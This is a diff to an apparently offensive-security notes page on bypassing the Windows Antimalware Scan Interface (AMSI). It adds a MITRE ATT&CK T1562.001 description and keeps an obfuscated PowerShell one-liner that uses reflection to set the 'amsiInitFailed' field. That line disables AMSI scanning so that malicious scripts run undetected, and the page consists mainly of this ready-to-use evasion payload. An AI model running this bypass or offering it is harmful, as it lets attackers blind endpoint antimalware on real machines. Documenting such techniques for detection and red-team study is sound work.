@@ -4,12 +4,20 @@ description: Antimalware Scan Interface (AMSI) Bypass
 
 # AMSI Bypass
 
+### MITRE ATT\&CK
+
+**T1562.001 - Impair Defenses: Disable or Modify Tools**
+
+**Description:**
+
+Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities. This may take many forms, such as killing security software processes or services, modifying / deleting Registry keys or configuration files so that tools do not operate properly, or other methods to interfere with security tools scanning or reporting information.
+
 ### AMSI Patch
 
 <figure><img src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEhn9RdQYNznIixLFSfvlM5q4CmArqalAyo3jKwha5p8CE_0BS791sHB4FMjOe7PUsFfcWYFdgd4084wzlHj5qi7ouMYhOkpa13aoo0ZJNAsSPMnVMUOJTeaBdAX6_j-YhKLfTj39zdJAyDzUovLrSLBko2cuuQiHesdVp-PWBacPIIQVB9MN0P-vJ_ocKY/s1000" alt=""><figcaption><p>AMSI Patch</p></figcaption></figure>
 
 {% code overflow="wrap" %}
-```csharp
+```powershell
 [Ref].Assembly.GetType(('System.Management.Automation.{0}{1}Utils' -f 'Am', 'si')).GetField(('am{0}InitFailed' -f 'si'),'NonPublic,Static').("Set" + "Value")($null,$true)
 ```
 {% endcode %}
